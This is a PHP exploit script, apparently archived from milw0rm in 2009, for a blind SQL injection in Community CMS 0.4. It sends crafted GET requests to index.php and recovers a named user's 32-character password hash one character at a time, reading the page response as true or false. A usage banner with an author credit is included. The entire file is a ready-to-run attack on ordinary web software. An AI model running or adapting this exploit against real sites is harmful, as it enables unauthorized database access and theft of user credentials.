--+++==============================================================+++--
--+++====== Community CMS <= 0.4 Blind SQL Injection Exploit ======+++--
--+++==============================================================+++--

<?php

function query ($user, $pos, $chr)
{
	$query = "x' OR ASCII(SUBSTRING((SELECT password FROM comcms_users WHERE username = '{$user}'),{$pos},1))={$chr} OR '1' = '2";
	$query = str_replace (" ", "%20", $query);
	$query = str_replace ("'", "%27", $query);

	return $query;
}

function exploit ($hostname, $path, $user, $pos, $chr)
{
	$chr = ord ($chr);
	$fp = fsockopen ($hostname, 80);
	
	$query = query ($user, $pos, $chr);
	$get =  "GET {$path}/index.php?id={$query} HTTP/1.1\r\n".
		"Host: {$hostname}\r\n".
		"Connection: Close\r\n\r\n";
	
	fputs ($fp, $get);

	while (!feof ($fp))
		$x .= fgets ($fp, 1024);
	
	fclose ($fp);
	
	if (preg_match ("/Failed to load page/", $x))
		return false;
	else
		return true;
	
}

function usage () {
	exit (
		"Community CMS <= 0.4 Blind SQL Injection Exploit".
		"\n[+] Author  : darkjoker".
		"\n[+] Site    : http://darkjoker.net23.net".
		"\n[+] Download: http://surfnet.dl.sourceforge.net/sourceforge/communitycms/communitycms-0.4.zip".
		"\n[+] Usage   : php xpl.php <localhost> <path> <username>".
		"\n[+] Ex.     : php xpl.php localhost /CommunityCMS admin".
		"\n[+] Greetz  : certaindeath".
		"\n\n");
}

if ($argc != 4)
	usage ();

$hostname = $argv [1];
$path = $argv [2];
$user = $argv [3];
$key = "abcdef0123456789";
$pos = 1;
$chr = 0;

echo "[+] Password: ";

while ($pos <= 32)
{
	if (exploit ($hostname, $path, $user, $pos, $key [$chr]))
	{
		echo $key [$chr];
		$chr = 0;
		$pos++;
	}
	else
		$chr++;
}

echo "\n\n";

?>

# milw0rm.com [2009-01-28]
